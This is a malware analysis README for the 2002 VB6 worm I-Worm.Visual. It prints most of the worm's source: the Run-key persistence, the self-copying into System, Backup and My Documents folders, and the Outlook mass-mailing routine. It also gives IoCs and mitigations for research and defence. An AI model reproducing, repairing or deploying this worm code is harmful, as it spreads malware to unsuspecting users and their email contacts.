# 🛡️ Malware Analysis Report: VB.Visual.Worm (I-Worm.Visual)

![Analysis Date](https://img.shields.io/badge/analysis_date-2025--11--05-blue)
![Malware Type](https://img.shields.io/badge/type-Win32%20Worm%20(VB6)-red)
![Creation Date](https://img.shields.io/badge/created-2002--05--19-orange)

## Overview

VB.Visual.Worm (a.k.a. I-Worm.Visual) is a Visual Basic 6.0 worm written by PetiK circa May 19, 2002. It attempts system persistence via the Run key, spreads by copying itself into user document folders, and mass-mails itself using Outlook automation. An "About" GUI form is displayed on the 19th of each month. The included About dialog states "No Dangerous Payloads", but the worm still makes system changes and sends email without consent.

Artifacts in this folder:
- `Visual.bas` — main module with worm logic
- `about.frm` / `about.frx` — VB6 About dialog form shown conditionally
- `visual.ex_` — packed/renamed sample binary
- `screenshot.png` — screenshot of the About window

> Disclaimer: This is a historical malware analysis for research/education. Do not execute this in production systems.

## Execution flow (Main)

Entry point is `Sub Main()` in `Visual.bas`.

```vb
Sub Main()
On Error Resume Next
Set fso = CreateObject("Scripting.FilesystemObject")
Set ws = CreateObject("WScript.Shell")
orig = App.Path & "\" & App.EXEName & ".exe"
cop = fso.GetSpecialFolder(1) & "\kern32dll.exe"
FileCopy orig, cop
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\kern32dll", cop
fso.CreateFolder ("C:\Backup")

ncopy = ""
For I = 1 To 10
  Randomize (Timer)
  ncopy = ncopy + Chr(Int(Rnd() * 26) + 97)
Next I
FileCopy orig, "C:\Backup\" & ncopy & ".exe"

Call inf(ws.SpecialFolders("MyDocuments"))

Set out = CreateObject("Outlook.Application")
Set map = out.GetNameSpace("MAPI")
' ... mass-mailing block (see below) ...

If Day(Now) = 19 Then about.Visible = True
End Sub
```

What it does:
- Copies itself to the System folder as `kern32dll.exe` and registers a Run key for persistence.
- Creates `C:\Backup` and drops another randomly named copy there.
- Calls `inf` to propagate into the user documents folder.
- Attempts Outlook mass-mailing of itself to address lists.
- On the 19th day of the month, shows the `about` form (GUI).

## Outlook mass-mailing

The worm tries to gather up to ~250 recipients per address list and send itself with a benign subject/body.

```vb
Set out = CreateObject("Outlook.Application")
Set map = out.GetNameSpace("MAPI")
If out = "Outlook" Then
  map.Logon "profile", "password"
  For y = 1 To map.AddressLists.Count
    Set z = map.AddressLists(y)
    x = 1
    Set mel = out.CreateItem(0)
    For oo = 1 To z.AddressEntries.Count
      e = z.AddressEntries(x)
      ml.Recipients.Add e
      x = x + 1
      If x < 250 Then oo = z.AddressEntries.Count
    Next oo
    mel.Subject = "New Visual Tool for U"
    mel.Body = "Look at this new tool by clicking on attached file."
    mel.Attachments.Add orig, 1, 1, "visual_tool.exe"
    mel.Send
    e = ""
  Next y
  map.Logoff
End If
```

Notes:
- There are apparent bugs/typos: `If out = "Outlook" Then` is not a valid type check; it likely never true. Also `ml.Recipients.Add e` should be `mel.Recipients.Add e`. In practice, the email spread may fail due to this.
- If it worked, recipients would get an email titled "New Visual Tool for U" with the worm attached as `visual_tool.exe`.

## File infection (copy/drop behavior)

The `inf` routine walks the files in a folder (My Documents) and for each file that isn’t a VBS, it drops a copy with an appended suffix.

```vb
Sub inf(folder)
Set dire = fso.GetFolder(folder)
Set fc = dire.Files
For Each f1 In fc
  ext = fso.GetExtensionName(f1.Path)
  ext = LCase(ext)
  oext = LCase(f1.Name)
  If (ext <> "vbs") Then
    If (Right(oext, 8) <> "old_.exe") Then
      FileCopy orig, f1.Path & "old_.exe"
    End If
  End If
Next
End Sub
```

Observations:
- This does not overwrite or modify the original document. It simply drops an extra executable beside it, named like `document.docold_.exe`. This relies on users double-clicking the disguised file.
- It skips `.vbs` files and avoids duplicating if the name already ends with `old_.exe`.

## About dialog (payload/branding)

The worm contains a VB6 form shown conditionally on day 19. From `about.frm`:

```vb
Caption  = "I-Worm.Visual"
Label1   = "Name : I-Worm.Visual"
Label2   = "Author : PetiK"
Label3   = "Origin : France"
Label4   = "Comments : No Dangerous Payloads"
Label5   = "(c) 2002"
```

- A "CLOSE THIS WINDOW" button calls `End` to terminate the process.
- See `screenshot.png` for the visual appearance.

## Persistence

- File: `%System%\kern32dll.exe` (copy of the worm)
- Registry: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\kern32dll = <path to kern32dll.exe>`
- Additional copy: `C:\Backup\<10 lowercase letters>.exe`

## Indicators of Compromise (IoCs)

- Dropped files in `C:\Backup\` with random lowercase names.
- Dropped side-by-side executables in My Documents with suffix `old_.exe` (e.g., `report.docold_.exe`).
- Run key value `kern32dll` pointing to `kern32dll.exe` in the System directory.
- Presence of About dialog assets: `about.frm`, `about.frx`.

## Mitigation

- Block or prompt COM automation for Outlook from untrusted processes.
- Hide file extensions for known file types should be disabled to avoid double-extension tricks.
- Monitor and restrict writes to HKLM Run keys and `%System%` directory by standard users.
- Use endpoint protection capable of detecting VB6 worms and email automation.

## Notes

While the About window claims "No Dangerous Payloads", this worm still persists in the system, drops executables in user folders, and attempts unsolicited mass mailing. Bugs in the mailing code may limit actual spread in the wild.